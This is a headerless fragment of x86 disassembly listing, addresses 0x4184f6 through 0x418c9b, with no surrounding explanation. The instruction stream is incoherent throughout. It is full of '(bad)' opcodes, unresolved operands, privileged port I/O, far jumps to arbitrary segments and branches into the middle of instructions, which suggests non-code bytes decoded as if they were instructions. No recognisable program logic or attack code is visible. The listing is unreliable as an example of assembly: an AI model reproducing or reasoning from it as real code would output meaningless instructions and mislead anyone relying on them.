  4184f6:	sub    BYTE PTR ds:0xd4f557e3,al
  4184fc:	xchg   ebx,eax
  4184fd:	inc    ecx
  4184fe:	or     bl,BYTE PTR [esi+0x7cdb5397]
  418504:	cmp    al,0x4d
  418506:	int3   
  418507:	jle    0x418494
  418509:	push   eax
  41850a:	mov    cl,0xc8
  41850c:	fmul   st(2),st
  41850e:	(bad)  
  418510:	rol    DWORD PTR [edi+0x39],cl
  418513:	add    eax,0x33de7d26
  418518:	out    dx,eax
  418519:	jne    0x4184db
  41851b:	loop   0x418587
  41851d:	sahf   
  41851e:	lods   al,BYTE PTR ds:[esi]
  41851f:	xchg   BYTE PTR [ecx+0x25],al
  418522:	aad    0xe2
  418524:	dec    edx
  418525:	jne    0x418596
  418527:	mov    al,ds:0x32ad0eeb
  41852c:	sub    eax,0xc8dcffa0
  418531:	inc    edx
  418532:	lahf   
  418533:	fs jmp 0xbfd5:0x8ec1f8e9
  41853b:	and    DWORD PTR [ecx],esp
  41853d:	nop
  41853e:	lods   eax,DWORD PTR ds:[esi]
  41853f:	mov    esi,edx
  418541:	popf   
  418542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418543:	xchg   ebx,eax
  418544:	jbe    0x4184ff
  418546:	push   ebx
  418547:	xor    bh,al
  418549:	std    
  41854a:	pusha  
  41854b:	jl     0x4184f5
  41854d:	adc    al,0x5d
  41854f:	xor    BYTE PTR [ecx-0x59],cl
  418552:	mov    ?,WORD PTR [edx-0xea9f614]
  418558:	imul   ebp,DWORD PTR [edi],0xb79426bf
  41855e:	jmp    0x109:0xeb8a55d9
  418565:	jmp    0x418515
  418567:	adc    ecx,ecx
  418569:	or     ah,bh
  41856b:	aaa    
  41856c:	fs sar dl,0xec
  418570:	ja     0x4185e6
  418572:	jne    0x41857f
  418574:	popf   
  418575:	test   DWORD PTR [ebx+0x7e],esi
  418578:	mov    DWORD PTR [edi-0x68a61a59],esp
  41857e:	gs (bad) 
  418580:	int3   
  418581:	repz pushf 
  418583:	fstp   st(1)
  418585:	jg     0x418577
  418587:	xor    cl,BYTE PTR [ebx]
  418589:	int    0x65
  41858b:	dec    eax
  41858c:	inc    ebx
  41858d:	cwde   
  41858e:	fwait
  41858f:	or     DWORD PTR [edi+0x4f0d3dbb],ebx
  418595:	(bad)  
  418596:	jmp    0x691c:0xed85e369
  41859d:	mov    bl,0x3c
  41859f:	add    edx,DWORD PTR [ebp-0x18]
  4185a2:	sub    bl,dl
  4185a4:	test   BYTE PTR [eax],cl
  4185a6:	gs jp  0x4185a4
  4185a9:	lods   al,BYTE PTR ds:[esi]
  4185aa:	push   0x2d
  4185ac:	mov    esi,0xea7fc820
  4185b1:	addr16 ds dec eax
  4185b4:	inc    DWORD PTR [esi-0x665cb076]
  4185ba:	inc    eax
  4185bb:	sub    esp,DWORD PTR fs:[esi]
  4185be:	add    eax,0x22d7a7cb
  4185c3:	imul   ecx,DWORD PTR [edi-0x50],0xe2907fae
  4185ca:	add    DWORD PTR [edi+0x44101600],edx
  4185d0:	add    al,0x84
  4185d2:	loop   0x4185ea
  4185d4:	or     DWORD PTR [eax],esp
  4185d6:	adc    eax,0x76
  4185d9:	aas    
  4185da:	inc    esp
  4185db:	(bad)  
  4185dc:	shl    BYTE PTR [edi],1
  4185de:	sub    al,0xc1
  4185e0:	bound  ebx,QWORD PTR [edi-0xbc68690]
  4185e6:	push   edx
  4185e7:	imul   ebp,eax,0xfffffffd
  4185ea:	jbe    0x418658
  4185ec:	add    dl,BYTE PTR [edx]
  4185ee:	dec    ebp
  4185ef:	shr    ch,0xf3
  4185f2:	xor    DWORD PTR [ebp-0x31],0x850ac1fc
  4185f9:	fidivr WORD PTR ds:0x28005f0
  4185ff:	and    dh,dl
  418601:	xchg   BYTE PTR [eax+0x75178bb9],al
  418607:	add    BYTE PTR [ebp+0x3c],ah
  41860a:	xchg   ebx,eax
  41860b:	aad    0x9e
  41860d:	push   ss
  41860e:	pushf  
  41860f:	sahf   
  418610:	xchg   ebx,eax
  418611:	js     0x4185cc
  418613:	add    al,0x1b
  418615:	mov    ebx,0x5ad0b72a
  41861a:	adc    ebx,DWORD PTR [eax-0x43519bbf]
  418620:	ss loop 0x418677
  418623:	xchg   ebp,eax
  418624:	cmp    al,0x49
  418626:	ret    
  418627:	shr    BYTE PTR [esp+esi*2-0x7654530],1
  41862e:	ss and DWORD PTR ss:[ecx],esi
  418632:	xor    edi,DWORD PTR [esi-0x37]
  418635:	imul   ebp,DWORD PTR [esi+0x2e456872],0x7d243335
  41863f:	mov    ds:0x1fa5273a,al
  418644:	(bad)  
  418646:	jge    0x41861e
  418648:	int    0xe9
  41864a:	jle    0x418656
  41864c:	add    al,0xc8
  41864e:	popa   
  41864f:	jmp    0xef99f671
  418654:	dec    ebp
  418655:	mov    dh,0x3a
  418657:	sub    eax,0xba1e796c
  41865c:	add    al,0x5
  41865e:	mov    ecx,0x8b3f0b42
  418663:	call   0xffa85248
  418668:	pop    ebx
  418669:	or     al,0xf
  41866b:	mov    ds:0xdebf06e3,eax
  418670:	in     al,dx
  418671:	outs   dx,DWORD PTR ds:[esi]
  418672:	ror    BYTE PTR [eax],1
  418674:	push   ss
  418675:	pop    edi
  418676:	test   BYTE PTR [edx-0x58],0x3f
  41867a:	xchg   esi,eax
  41867b:	dec    ebp
  41867c:	and    bl,ch
  41867e:	stc    
  41867f:	xchg   esi,eax
  418680:	ins    BYTE PTR es:[edi],dx
  418681:	cmp    DWORD PTR [eax-0x738251cf],esp
  418687:	lock out 0x2b,eax
  41868a:	pusha  
  41868b:	adc    eax,0xfbd8971f
  418690:	jae    0x418711
  418692:	push   edx
  418693:	mov    cl,0xe2
  418695:	fmul   QWORD PTR [eax+0x6790a9c3]
  41869b:	(bad)  
  41869c:	into   
  41869d:	pop    ecx
  41869e:	stc    
  41869f:	xor    bh,al
  4186a1:	xchg   edi,eax
  4186a3:	add    eax,0x7a9ed3a7
  4186a8:	jp     0x418701
  4186aa:	(bad)
  4186ae:	out    dx,al
  4186af:	cmp    eax,0xccb467b6
  4186b4:	imul   DWORD PTR [edi+0x69]
  4186b7:	adc    eax,0xc1d52e15
  4186bc:	int    0x2b
  4186be:	scas   al,BYTE PTR es:[edi]
  4186bf:	sbb    bl,dl
  4186c1:	sbb    dl,bl
  4186c3:	or     al,0x68
  4186c5:	inc    edi
  4186c6:	add    DWORD PTR [eax+ecx*1+0x204e43d9],ebp
  4186cd:	ds push 0x1
  4186d0:	cmp    al,ah
  4186d2:	xchg   edx,eax
  4186d3:	push   ss
  4186d4:	(bad)  
  4186d5:	mov    dh,0xfc
  4186d7:	cmc    
  4186d8:	ja     0x4186ea
  4186da:	dec    edx
  4186db:	xor    ah,BYTE PTR [edx-0x28]
  4186de:	mov    dl,0x11
  4186e0:	ins    DWORD PTR es:[edi],dx
  4186e1:	push   es
  4186e2:	(bad)  
  4186e4:	mov    dh,0x84
  4186e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186e7:	pop    ss
  4186e8:	rol    DWORD PTR [eax-0xaa7a6f6],1
  4186ee:	cmp    ah,BYTE PTR [esi+ebp*8-0x2a4d8462]
  4186f5:	adc    DWORD PTR [esi+0x78],esp
  4186f8:	mov    BYTE PTR [esp+eiz*2],bl
  4186fb:	out    0xeb,eax
  4186fd:	popa   
  4186fe:	sbb    BYTE PTR [esi],dh
  418700:	(bad)  
  418701:	fwait
  418702:	lods   eax,DWORD PTR ss:[esi]
  418704:	icebp  
  418705:	in     al,dx
  418706:	push   ebp
  418707:	(bad)  
  418708:	mov    ecx,0x8b1bb284
  41870d:	out    dx,al
  41870e:	std    
  41870f:	jp     0x4186e9
  418711:	pop    eax
  418712:	rcr    BYTE PTR [ecx],1
  418714:	sbb    cl,bl
  418716:	sbb    BYTE PTR [edx],bl
  418718:	dec    eax
  418719:	cmp    BYTE PTR [eax],ch
  41871b:	stos   DWORD PTR es:[edi],eax
  41871c:	aam    0xcd
  41871e:	int    0x85
  418720:	arpl   WORD PTR [edi+0x425ea593],si
  418726:	fsubr  QWORD PTR [ebp+0x75]
  418729:	push   ss
  41872a:	call   0xdab1:0xd7d1d6d3
  418731:	and    DWORD PTR [ecx-0x2b26f89],edx
  418737:	or     ebp,DWORD PTR [ebp+0x79]
  41873a:	xor    eax,esi
  41873c:	mov    ds:0xeea053e4,al
  418741:	or     al,0x37
  418743:	inc    ebx
  418744:	repz fimul DWORD PTR [ecx]
  418747:	je     0x4186cb
  418749:	mov    eax,ds:0xee526484
  41874e:	pop    esi
  41874f:	sub    ch,al
  418751:	repz pop edx
  418753:	fwait
  418754:	int    0xe8
  418756:	stos   DWORD PTR es:[edi],eax
  418757:	sub    al,0x23
  418759:	cli    
  41875a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41875b:	add    al,0x2f
  41875d:	jnp    0x418754
  41875f:	iret   
  418760:	push   esi
  418761:	fadd   QWORD PTR [eax+0x14]
  418764:	mov    ch,0x3b
  418766:	push   ecx
  418767:	pop    eax
  418768:	fmul   QWORD PTR [esi+0x4e]
  41876b:	mov    eax,ds:0xaee24925
  418770:	and    al,0xb1
  418772:	mov    bl,0x54
  418774:	xchg   edi,eax
  418775:	or     ebx,esp
  418777:	jns    0x418717
  418779:	mov    al,0xa8
  41877b:	jo     0x41870d
  41877d:	pop    ecx
  41877e:	ret    0xb9ec
  418781:	je     0x4187c1
  418783:	jle    0x41877c
  418785:	xchg   ecx,eax
  418786:	retf   
  418787:	sbb    esp,DWORD PTR ds:0x6d919700
  41878d:	sub    BYTE PTR [ecx-0x3c],al
  418790:	lahf   
  418791:	pop    es
  418792:	fs mov dh,0x2a
  418795:	aaa    
  418796:	in     al,0xcd
  418798:	add    eax,0x23bd6c53
  41879d:	test   DWORD PTR [ecx],0x4aa79c02
  4187a3:	pop    ds
  4187a4:	inc    edx
  4187a5:	pop    ecx
  4187a6:	add    BYTE PTR [ecx+0x7a2dfb46],bh
  4187ac:	dec    eax
  4187ad:	lds    esp,FWORD PTR ds:0x1529db7d
  4187b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187b4:	pusha  
  4187b5:	and    al,0x6f
  4187b7:	nop
  4187b8:	sbb    al,0x50
  4187ba:	xchg   edx,eax
  4187bb:	ins    BYTE PTR es:[edi],dx
  4187bc:	and    DWORD PTR [eax-0x33],0xd
  4187c0:	cs xchg ebp,eax
  4187c2:	pushf  
  4187c3:	sbb    bh,BYTE PTR [ebp-0x5aedfcd8]
  4187c9:	pop    ss
  4187ca:	outs   dx,DWORD PTR ds:[esi]
  4187cb:	sahf   
  4187cc:	es mov ecx,0xfb6c6ca1
  4187d2:	je     0x4187a0
  4187d4:	loope  0x418782
  4187d6:	daa    
  4187d7:	bound  esi,QWORD PTR [ecx+eax*2]
  4187da:	out    0x39,al
  4187dc:	inc    ecx
  4187dd:	and    DWORD PTR [esp+edx*4],eax
  4187e0:	xlat   BYTE PTR ds:[ebx]
  4187e1:	(bad)  
  4187e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e3:	mov    ah,0x4
  4187e5:	sar    ah,cl
  4187e7:	rol    edi,0xb9
  4187ea:	pop    esp
  4187eb:	lds    ecx,FWORD PTR [esi+0x510e2801]
  4187f1:	ficomp DWORD PTR [esi-0x23]
  4187f4:	gs adc eax,ebx
  4187f7:	aas    
  4187f8:	outs   dx,BYTE PTR ds:[esi]
  4187f9:	dec    eax
  4187fa:	sbb    BYTE PTR [ebp-0x6bdaa4a1],dl
  418800:	fld    QWORD PTR [esi+ecx*2]
  418803:	mov    ch,0x19
  418805:	test   DWORD PTR [ebp+0x5c807ee2],0x46ce3087
  41880f:	ja     0x41883e
  418811:	xchg   edx,eax
  418812:	and    al,0x17
  418814:	shl    DWORD PTR [ebx-0x4200feec],cl
  41881a:	sbb    DWORD PTR [ecx+0xa],ebp
  41881d:	mov    eax,0x4e7c8735
  418822:	mov    ss,WORD PTR [esi-0x14]
  418825:	cmp    esp,DWORD PTR [edx+0x6b17f04b]
  41882b:	xchg   DWORD PTR [edi-0x70527437],eax
  418831:	call   0x329a:0x6ab4397c
  418838:	adc    al,0x2a
  41883a:	sub    al,0x40
  41883c:	xchg   ecx,eax
  41883d:	push   es
  41883e:	sahf   
  41883f:	rcr    BYTE PTR ds:[edi+0x72],cl
  418843:	aam    0x2d
  418845:	add    edx,DWORD PTR [ebp+0x55]
  418848:	out    0x41,eax
  41884a:	or     eax,0xf29e8fc
  41884f:	fcomp  DWORD PTR [eax]
  418851:	or     eax,0x11a34642
  418856:	call   0x74ad7c77
  41885b:	and    al,0x33
  41885d:	mov    edi,0x6ed8a12c
  418862:	mov    WORD PTR [eax+ebp*4+0x5b],fs
  418866:	loope  0x4187e9
  418868:	xchg   ebp,eax
  418869:	xor    BYTE PTR [ecx+esi*2-0x15],0x5e
  41886e:	lods   eax,DWORD PTR ds:[esi]
  41886f:	sbb    al,0x2b
  418871:	sbb    eax,0x4cb2dac9
  418876:	mov    eax,0xcd009a76
  41887b:	push   ecx
  41887c:	push   edx
  41887d:	sub    al,0x3c
  41887f:	mov    ds:0x23346bd1,eax
  418884:	push   es
  418885:	mov    bh,BYTE PTR ds:0x8139a7e6
  41888b:	call   FWORD PTR gs:[esp+edx*8-0x36]
  418890:	pop    esp
  418891:	jo     0x41883d
  418893:	rol    DWORD PTR [ebp-0x2a0e1d78],1
  418899:	jl     0x418869
  41889b:	scas   al,BYTE PTR es:[edi]
  41889c:	imul   esi,DWORD PTR [eax],0xffffff89
  41889f:	adc    eax,esi
  4188a1:	jae    0x41886a
  4188a3:	push   ss
  4188a4:	sub    eax,0x1acf7805
  4188a9:	and    al,0xbd
  4188ab:	adc    DWORD PTR [esi],edx
  4188ad:	into   
  4188ae:	add    eax,0x5a94866c
  4188b3:	adc    al,0x58
  4188b5:	lea    ecx,[esi]
  4188b7:	out    0xb1,eax
  4188b9:	adc    bl,BYTE PTR [eax]
  4188bb:	out    dx,eax
  4188bc:	inc    esi
  4188bd:	jb     0x41892e
  4188bf:	repnz aam 0x8b
  4188c2:	jle    0x418914
  4188c4:	fistp  QWORD PTR [ebp+eax*4-0x15]
  4188c8:	mov    esp,ecx
  4188ca:	dec    edi
  4188cb:	add    edi,esi
  4188cd:	mov    ebp,0x77f6d20a
  4188d2:	mov    ?,WORD PTR [ecx]
  4188d4:	retf   0x8c76
  4188d7:	hlt    
  4188d8:	push   0x20b3ac41
  4188dd:	or     al,0xa6
  4188df:	(bad)  [esi-0x23]
  4188e2:	call   0x7d60:0x68bb8597
  4188e9:	out    0xd5,al
  4188eb:	mov    ds:0xb31c3921,al
  4188f0:	cmp    DWORD PTR [ebx-0x1c],ebp
  4188f3:	nop
  4188f4:	sbb    ebp,DWORD PTR [ebx+0x1b1f7389]
  4188fa:	xchg   edx,eax
  4188fb:	add    eax,0x9eda8906
  418900:	pop    ds
  418901:	scas   eax,DWORD PTR es:[edi]
  418902:	ror    ch,cl
  418904:	push   ecx
  418905:	add    ebp,esp
  418907:	test   DWORD PTR [esi],ebx
  418909:	lea    ecx,[edx]
  41890b:	pop    ebp
  41890c:	shl    BYTE PTR [eax-0x33caacee],cl
  418912:	mov    edx,DWORD PTR [ecx+0x0]
  418915:	adc    BYTE PTR [ebp-0x5aa2465],dh
  41891b:	ss inc ebx
  41891d:	out    0x31,eax
  41891f:	mov    edi,0x577991f8
  418924:	push   0xfffffffc
  418926:	xor    al,BYTE PTR [ebp-0x67]
  418929:	and    eax,0x8244003
  41892e:	xchg   edx,eax
  41892f:	cli    
  418930:	imul   edx,esi,0xffffffd1
  418933:	pop    es
  418934:	test   al,0x54
  418936:	std    
  418937:	dec    ecx
  418938:	jo     0x4188bf
  41893a:	cmp    eax,DWORD PTR ds:0x17cb53bc
  418941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418942:	jecxz  0x41894d
  418944:	push   esp
  418945:	add    eax,0x6ade6284
  41894a:	cs in  eax,dx
  41894c:	xchg   esp,eax
  41894d:	ror    ah,0xb9
  418950:	sub    BYTE PTR ds:0x1ebe210d,dh
  418956:	fisttp WORD PTR [ecx]
  418958:	dec    ecx
  418959:	and    eax,0xfc404edf
  41895e:	or     DWORD PTR [ecx],ecx
  418960:	imul   DWORD PTR [edx+0xa]
  418963:	pop    eax
  418964:	pop    ecx
  418965:	push   ds
  418966:	retf   
  418967:	jg     0x418959
  418969:	into   
  41896a:	jg     0x4189b3
  41896c:	hlt    
  41896d:	sbb    al,0xcc
  41896f:	mov    al,ds:0x85e0bad5
  418974:	pop    ss
  418975:	in     eax,dx
  418976:	sbb    eax,0xc9b05d2b
  41897b:	adc    BYTE PTR [edi-0x6b8c72f1],cl
  418981:	or     cl,ch
  418983:	int    0xff
  418985:	adc    dh,cl
  418987:	fld    TBYTE PTR [esi+0x23]
  41898a:	push   esi
  41898b:	aam    0x5c
  41898d:	push   cs
  41898e:	ins    DWORD PTR es:[edi],dx
  41898f:	xor    DWORD PTR [esi],0x72
  418992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418993:	rcl    BYTE PTR [edi],1
  418995:	ror    BYTE PTR [ecx+0x5a],0xa3
  418999:	sub    eax,0x7bc2f75c
  41899e:	sbb    bl,BYTE PTR [edi]
  4189a0:	inc    esi
  4189a1:	add    bl,BYTE PTR [ebx+0x4b]
  4189a4:	sbb    al,0x2
  4189a6:	nop
  4189a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189a8:	push   edi
  4189a9:	fisttp WORD PTR [esi+0x6c]
  4189ac:	add    DWORD PTR [ecx-0x77347753],ecx
  4189b2:	test   al,0xfa
  4189b4:	push   edx
  4189b5:	mov    ds:0x991b9d9d,eax
  4189ba:	(bad)  
  4189bb:	stc    
  4189bc:	out    0xa0,al
  4189be:	fldcw  WORD PTR [edi+0x1d]
  4189c1:	inc    edi
  4189c2:	sar    BYTE PTR [esi],cl
  4189c4:	push   0xffffff91
  4189c6:	xchg   DWORD PTR [edx-0x4079fac2],edx
  4189cc:	dec    ebp
  4189cd:	sub    DWORD PTR [esi],ebp
  4189cf:	outs   dx,BYTE PTR ds:[esi]
  4189d0:	arpl   WORD PTR [eax],cx
  4189d2:	fcomp  DWORD PTR [esi]
  4189d4:	les    esi,FWORD PTR [edi-0x53]
  4189d7:	mov    esp,0xea30ea7d
  4189dc:	sbb    esi,DWORD PTR [ecx+0x51]
  4189df:	xor    DWORD PTR [edx-0x11],0x98c79cec
  4189e6:	inc    ebx
  4189e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189e8:	icebp  
  4189e9:	ja     0x4189a9
  4189eb:	das    
  4189ec:	(bad)  
  4189ed:	xchg   ebx,eax
  4189ee:	clc    
  4189ef:	cmp    eax,0xb7f3001b
  4189f4:	push   esi
  4189f5:	sub    cl,dh
  4189f7:	scas   al,BYTE PTR es:[edi]
  4189f8:	xor    BYTE PTR [edi],bh
  4189fa:	xor    ecx,DWORD PTR [esi+0x79]
  4189fd:	imul   edi,DWORD PTR [ecx],0x60
  418a00:	les    eax,FWORD PTR [edi-0x44]
  418a03:	inc    edx
  418a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a05:	adc    BYTE PTR [edi-0x3cce796],0x1a
  418a0c:	pusha  
  418a0d:	or     eax,0x6324a960
  418a12:	pop    ecx
  418a13:	shl    BYTE PTR [esi+0x60],0xdf
  418a17:	xor    BYTE PTR [ebp+0xb0b329c],dh
  418a1d:	repnz iret 
  418a1f:	clc    
  418a20:	mov    al,ds:0xd6763766
  418a25:	dec    edi
  418a26:	add    al,0x98
  418a28:	rcl    DWORD PTR [ecx],cl
  418a2a:	stc    
  418a2b:	nop
  418a2c:	aad    0x9e
  418a2e:	mov    bh,0x51
  418a30:	test   eax,0x4bca3db2
  418a35:	xchg   ecx,eax
  418a36:	mov    al,BYTE PTR [ebp-0x637ac6e1]
  418a3c:	mov    ebp,0x6c7a25e0
  418a41:	out    dx,eax
  418a42:	jecxz  0x418a1f
  418a44:	popa   
  418a45:	mov    edx,0x2cf42760
  418a4a:	push   0x5f
  418a4c:	fidivr DWORD PTR [edi]
  418a4e:	jg     0x418a47
  418a50:	mov    eax,0x5b56be7d
  418a55:	in     al,dx
  418a56:	sbb    dh,al
  418a58:	ja     0x418a05
  418a5a:	and    edi,DWORD PTR [ecx]
  418a5c:	call   0x418b2181
  418a61:	pusha  
  418a62:	lea    edx,[ecx+0xe]
  418a65:	mov    ch,0x5a
  418a67:	pop    ecx
  418a68:	into   
  418a69:	xchg   esi,eax
  418a6a:	pop    ebx
  418a6b:	mov    ch,0xa8
  418a6d:	xor    esi,edi
  418a6f:	push   es
  418a70:	dec    ebp
  418a71:	mov    ebx,0x8960ea36
  418a76:	stos   BYTE PTR es:[edi],al
  418a77:	outs   dx,DWORD PTR ds:[esi]
  418a78:	out    0x95,al
  418a7a:	shr    BYTE PTR [edi+0x2c],1
  418a7d:	pop    ecx
  418a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a7f:	neg    DWORD PTR [esi]
  418a81:	not    ch
  418a83:	push   ebp
  418a84:	push   0xe5cb20aa
  418a89:	sbb    al,0x7e
  418a8b:	add    DWORD PTR [esi+edi*4-0x7c],edx
  418a8f:	push   ss
  418a90:	mov    bh,0x42
  418a92:	jne    0x418a15
  418a94:	sub    DWORD PTR [edi-0x2c],ebp
  418a97:	mov    edx,DWORD PTR [ebp-0x4f]
  418a9a:	mov    BYTE PTR [edx+0x3514f61f],dl
  418aa0:	push   ds
  418aa1:	xor    edx,0xffffffff
  418aa4:	cmp    DWORD PTR [edi],eax
  418aa6:	adc    DWORD PTR [ebp-0x4b],edi
  418aa9:	mov    eax,0xbe582842
  418aae:	xlat   BYTE PTR ds:[ebx]
  418aaf:	jno    0x418a55
  418ab1:	iret   
  418ab2:	mov    ch,0x62
  418ab4:	cmp    bh,BYTE PTR [edx+edx*2-0x4a01ca44]
  418abb:	jg     0x418afe
  418abd:	mov    ch,0x9c
  418abf:	sub    al,BYTE PTR [edx]
  418ac1:	cli    
  418ac2:	mov    bl,0x2b
  418ac4:	repz ds ret 
  418ac7:	cmp    DWORD PTR [esi-0x4f],esp
  418aca:	sbb    DWORD PTR [edi-0x36],edi
  418acd:	mov    edx,0x52f9f50d
  418ad2:	jo     0x418aed
  418ad4:	push   cs
  418ad5:	mov    dh,0xf7
  418ad7:	lods   eax,DWORD PTR ds:[esi]
  418ad8:	mov    bh,0x76
  418ada:	cmc    
  418adb:	sub    al,dh
  418add:	stos   DWORD PTR es:[edi],eax
  418ade:	retf   
  418adf:	xor    DWORD PTR [ecx+0x753e8e4],ebp
  418ae5:	mov    BYTE PTR [ebp+0x37],0x57
  418ae9:	imul   edi,DWORD PTR [esi],0xc54ea721
  418aef:	pop    ebp
  418af0:	mov    al,0x27
  418af2:	xchg   edi,eax
  418af3:	push   esp
  418af4:	xchg   esp,eax
  418af5:	ins    BYTE PTR es:[edi],dx
  418af6:	sub    DWORD PTR [ebx+0xf1bd549],eax
  418afc:	xchg   edx,eax
  418afd:	cmp    al,0x62
  418aff:	mov    bl,0x8e
  418b01:	jnp    0x418b35
  418b03:	inc    ch
  418b05:	jp     0x418b51
  418b07:	sub    DWORD PTR [edx],ebx
  418b09:	fnsave [ecx]
  418b0b:	clc    
  418b0c:	pop    ss
  418b0d:	bound  esi,QWORD PTR [ebx+0x423fcd9]
  418b13:	das    
  418b14:	adc    DWORD PTR [esi],ebp
  418b16:	add    DWORD PTR fs:[edx-0x62],0x79
  418b1b:	sub    DWORD PTR [eax],ebx
  418b1d:	mov    esp,?
  418b1f:	ror    DWORD PTR [edi-0x62],1
  418b22:	mov    edi,0x98410fb1
  418b27:	push   ecx
  418b28:	push   ds
  418b29:	pop    esp
  418b2a:	xlat   BYTE PTR ds:[ebx]
  418b2b:	jb     0x418ad8
  418b2d:	add    ebx,DWORD PTR ds:0x144b8b07
  418b33:	lods   al,BYTE PTR ds:[esi]
  418b34:	aas    
  418b35:	sub    edi,0xb6114949
  418b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b3c:	push   0x9ac20591
  418b41:	push   cs
  418b42:	fild   WORD PTR [ebx-0x4e804c6b]
  418b48:	push   ss
  418b49:	xchg   ebp,eax
  418b4a:	dec    esi
  418b4b:	mov    ds:0x801d035a,eax
  418b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b51:	cmp    esi,DWORD PTR [esi+0x6]
  418b54:	jbe    0x418b00
  418b56:	push   ebp
  418b57:	mov    esp,DWORD PTR [ecx]
  418b59:	push   esi
  418b5a:	out    0xb0,al
  418b5c:	mov    eax,ds:0xc4c7dec1
  418b61:	xchg   edi,eax
  418b62:	(bad)  
  418b63:	jle    0x418b30
  418b65:	ds mov esi,ebx
  418b68:	and    BYTE PTR [esi+0x4d5d2a03],ah
  418b6e:	in     eax,dx
  418b6f:	mul    BYTE PTR [eax+0x18]
  418b72:	push   es
  418b73:	in     al,0x3b
  418b75:	cmp    bh,BYTE PTR ds:0x903a4e65
  418b7b:	inc    edx
  418b7c:	fs mov al,0x35
  418b7f:	outs   dx,BYTE PTR ds:[esi]
  418b80:	cmp    ecx,DWORD PTR [edi-0x2d]
  418b83:	xchg   bh,cl
  418b85:	test   DWORD PTR [esi],eax
  418b87:	push   0xa2be3415
  418b8c:	inc    esi
  418b8d:	or     bl,BYTE PTR [edi]
  418b8f:	pop    edx
  418b90:	in     al,0x9d
  418b92:	aas    
  418b93:	cwde   
  418b94:	mov    WORD PTR [ecx+0x73],gs
  418b97:	push   ds
  418b98:	push   edi
  418b99:	push   ds
  418b9a:	mov    ch,0xeb
  418b9c:	mov    BYTE PTR [edx-0x8],cl
  418b9f:	mov    al,ds:0x7e951a5e
  418ba4:	dec    esi
  418ba5:	mov    bl,BYTE PTR [esi+0x77]
  418ba8:	icebp  
  418ba9:	ret    
  418baa:	and    DWORD PTR [edi],ebp
  418bac:	cmp    BYTE PTR [edi+0x2dcc7ed2],0x8d
  418bb3:	pop    eax
  418bb4:	mov    WORD PTR [edi+0x6d],ds
  418bb7:	or     eax,0x98d1662e
  418bbc:	in     al,0x7c
  418bbe:	rcr    cl,cl
  418bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bc2:	jnp    0x418beb
  418bc4:	add    DWORD PTR [esi+esi*1],esi
  418bc7:	repnz sbb bl,BYTE PTR [eax+0x4eb90518]
  418bce:	mov    WORD PTR [ecx-0x214f2e5e],?
  418bd4:	in     eax,0x63
  418bd6:	imul   BYTE PTR ds:0x2e408e84
  418bdc:	mov    eax,0xe9ed76eb
  418be1:	sub    eax,0xba899d9c
  418be6:	jns    0x418bea
  418be8:	mov    DWORD PTR [eax-0xbdd1522],esi
  418bee:	and    BYTE PTR [ebx],0x82
  418bf1:	stc    
  418bf2:	push   ebp
  418bf3:	and    DWORD PTR [ebx+edx*8+0x1a890b83],edx
  418bfa:	push   eax
  418bfb:	jp     0x418bd3
  418bfd:	les    eax,FWORD PTR [edx-0x39]
  418c00:	mov    ecx,ecx
  418c02:	jge    0x418bc3
  418c04:	scas   eax,DWORD PTR es:[edi]
  418c05:	jp     0x418b93
  418c07:	pop    edi
  418c08:	dec    edi
  418c09:	mov    al,0xfb
  418c0b:	fcomp  QWORD PTR [eax+0x29]
  418c0e:	and    edx,DWORD PTR [edx]
  418c10:	aam    0xf0
  418c12:	dec    esp
  418c13:	test   al,0xa8
  418c15:	and    edi,DWORD PTR [ebp+edx*2+0x55fb7c7b]
  418c1c:	push   ebp
  418c1d:	sbb    dl,BYTE PTR [ebp-0x27936f5e]
  418c23:	cmc    
  418c24:	jl     0x418c4f
  418c26:	and    DWORD PTR [edx-0x3fc697e9],esi
  418c2c:	pop    es
  418c2d:	xor    eax,0x79e4dd6a
  418c32:	pop    ecx
  418c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c34:	sbb    BYTE PTR [edx-0x6d],ah
  418c37:	sbb    bh,BYTE PTR [eax]
  418c39:	lock add DWORD PTR [ecx+ecx*2-0x447e6231],edi
  418c41:	int3   
  418c42:	std    
  418c43:	(bad)  
  418c44:	jecxz  0x418cbb
  418c46:	xchg   esp,eax
  418c47:	in     al,0x52
  418c49:	mov    ah,0xbe
  418c4b:	cmp    al,0x27
  418c4e:	and    eax,DWORD PTR [ecx+0x44506cee]
  418c54:	dec    esp
  418c55:	add    BYTE PTR [ebx-0x64],0xc5
  418c59:	icebp  
  418c5a:	pop    ebx
  418c5b:	sub    eax,0x9cfacc5c
  418c60:	(bad)  
  418c61:	cwde   
  418c62:	xchg   DWORD PTR [esi+0x14],eax
  418c65:	xlat   BYTE PTR ds:[ebx]
  418c66:	stc    
  418c67:	sub    eax,0xf975a4dc
  418c6c:	cmp    al,0xed
  418c6e:	push   esi
  418c6f:	into   
  418c70:	out    dx,eax
  418c71:	sub    ecx,DWORD PTR [eax]
  418c73:	fisttp WORD PTR [esi+0xede5f4f]
  418c79:	ds push esp
  418c7b:	scas   eax,DWORD PTR es:[edi]
  418c7c:	push   cs
  418c7d:	and    eax,0xe5e7071
  418c82:	xor    BYTE PTR [ecx-0x5c],dh
  418c85:	adc    bh,dh
  418c87:	sub    al,0x4e
  418c89:	test   al,0x2e
  418c8b:	bound  eax,QWORD PTR [edx]
  418c8d:	in     eax,dx
  418c8e:	xor    ah,BYTE PTR [ecx+esi*2+0x1ca1e84b]
  418c95:	dec    esi
  418c96:	sbb    esp,ebx
  418c98:	in     eax,dx
  418c99:	and    esp,eax
  418c9b:	cmp    al,0x42
